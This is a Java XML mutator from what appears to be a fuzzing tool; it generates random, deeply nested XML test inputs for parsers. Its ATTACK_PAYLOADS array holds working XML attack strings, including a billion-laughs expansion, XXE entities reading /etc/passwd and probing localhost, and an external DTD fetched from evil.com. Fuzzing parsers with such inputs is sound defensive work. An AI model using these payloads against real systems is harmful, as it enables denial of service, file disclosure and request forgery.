package edu.nju.fuzzing.mutate;

import edu.nju.fuzzing.model.Seed;
import edu.nju.fuzzing.model.Testcase;

import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.concurrent.ThreadLocalRandom;

public class XmlMutator implements Mutator {

    private static final int MAX_DEPTH = 30; // 调高最大深度

    private static final String[] ATTACK_PAYLOADS = {
            "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">]><root>&lol3;</root>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"http://127.0.0.1:80/\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % ext SYSTEM \"http://evil.com/dtd\">%ext;]>",
            "<root><![CDATA[ " + "A".repeat(10000),
    };

    private static final String[] TAG_NAMES = {"root", "foo", "bar", "div", "span", "a", "b", "config", "data"};
    private static final String[] ATTRIBUTE_NAMES = {"id", "class", "href", "style", "xmlns", "xmlns:x", "data-val"};

    @Override
    public Iterator<Testcase> mutate(Seed seed, int energy) {
        int count = Math.max(1, energy);

        return new Iterator<Testcase>() {
            private int remaining = count;

            @Override
            public boolean hasNext() {
                return remaining > 0;
            }

            @Override
            public Testcase next() {
                if (remaining <= 0) throw new NoSuchElementException();
                remaining--;

                ThreadLocalRandom rand = ThreadLocalRandom.current();
                byte[] finalBytes;
                String grammarName = "XML";

                int strategy = rand.nextInt(100);
                if (strategy < 10) {
                    // [10%] 攻击 Payload
                    finalBytes = ATTACK_PAYLOADS[rand.nextInt(ATTACK_PAYLOADS.length)].getBytes(StandardCharsets.UTF_8);
                    grammarName = "XML:Payload";
                } else {
                    // [90%] 结构化生成
                    StringBuilder xml = new StringBuilder();
                    generateProlog(xml, rand);

                    // 核心改进：10% 的概率开启“深度轰炸”模式
                    boolean forceDeep = rand.nextInt(10) == 0;
                    generateElement(xml, 0, rand, forceDeep);

                    finalBytes = encodeWithBom(xml.toString(), rand);
                    grammarName = forceDeep ? "XML:DeepGen" : "XML:Gen";
                }

                return new Testcase(finalBytes, seed, "grammar:" + grammarName);
            }
        };
    }

    private void generateProlog(StringBuilder sb, ThreadLocalRandom rand) {
        if (rand.nextBoolean()) {
            sb.append("<?xml version=\"").append(rand.nextBoolean() ? "1.0" : "1.1").append("\"?>");
        }
        if (rand.nextInt(5) == 0) {
            sb.append("<!DOCTYPE root [");
            if (rand.nextBoolean()) sb.append("<!ENTITY x \"test\">");
            else sb.append("<!ELEMENT root ANY>");
            sb.append("]>");
        }
    }

    /**
     * 递归生成元素
     * @param forceDeep 如果为 true，则在达到 MAX_DEPTH 前尽量不停止递归
     */
    private void generateElement(StringBuilder sb, int depth, ThreadLocalRandom rand, boolean forceDeep) {
        // 停止条件
        if (depth > MAX_DEPTH) {
            sb.append(generateText(rand));
            return;
        }

        // 如果不是 forceDeep 模式，保持原有的随机停止逻辑
        if (!forceDeep && depth > 2 && rand.nextInt(10) < 4) {
            sb.append(generateText(rand));
            return;
        }

        String tagName = TAG_NAMES[rand.nextInt(TAG_NAMES.length)];
        sb.append("<").append(tagName);

        // 属性
        int attrCount = rand.nextInt(4);
        for (int i = 0; i < attrCount; i++) {
            String quote = (rand.nextInt(10) < 8) ? "\"" : (rand.nextInt(10) < 8 ? "'" : "");
            sb.append(" ").append(ATTRIBUTE_NAMES[rand.nextInt(ATTRIBUTE_NAMES.length)])
                    .append("=").append(quote).append(rand.nextInt(100)).append(quote);
        }

        // 自闭合（深层模式下不自闭合，否则深度断裂）
        if (!forceDeep && rand.nextInt(10) == 0) {
            sb.append("/>");
            return;
        }
        sb.append(">");

        // 内容生成
        if (forceDeep && depth < MAX_DEPTH) {
            // 深度模式：强制至少生成一个子元素以增加深度
            generateElement(sb, depth + 1, rand, forceDeep);
            // 偶尔加点文本混淆
            if (rand.nextBoolean()) sb.append(generateText(rand));
        } else {
            // 普通模式：随机生成子节点
            int childCount = rand.nextInt(3);
            for (int i = 0; i < childCount; i++) {
                int nodeType = rand.nextInt(100);
                if (nodeType < 50) generateElement(sb, depth + 1, rand, forceDeep);
                else if (nodeType < 90) sb.append(generateText(rand));
                else sb.append("<![CDATA[").append(generateText(rand)).append("]]>");
            }
        }

        sb.append("</").append(tagName).append(">");
    }

    private String generateText(ThreadLocalRandom rand) {
        if (rand.nextInt(10) == 0) return "&lt;fuzz&gt;";
        return "text_" + rand.nextInt(100);
    }

    private byte[] encodeWithBom(String content, ThreadLocalRandom rand) {
        int encodingType = rand.nextInt(10);
        Charset charset = StandardCharsets.UTF_8;
        byte[] bom = new byte[0];

        if (encodingType == 0) {
            charset = StandardCharsets.UTF_16BE;
            bom = new byte[]{(byte) 0xFE, (byte) 0xFF};
        } else if (encodingType == 1) {
            charset = StandardCharsets.UTF_16LE;
            bom = new byte[]{(byte) 0xFF, (byte) 0xFE};
        } else if (encodingType == 2) {
            bom = new byte[]{(byte) 0xEF, (byte) 0xBB, (byte) 0xBF};
        }

        byte[] contentBytes = content.getBytes(charset);
        byte[] result = new byte[bom.length + contentBytes.length];
        System.arraycopy(bom, 0, result, 0, bom.length);
        System.arraycopy(contentBytes, 0, result, bom.length, contentBytes.length);
        return result;
    }
}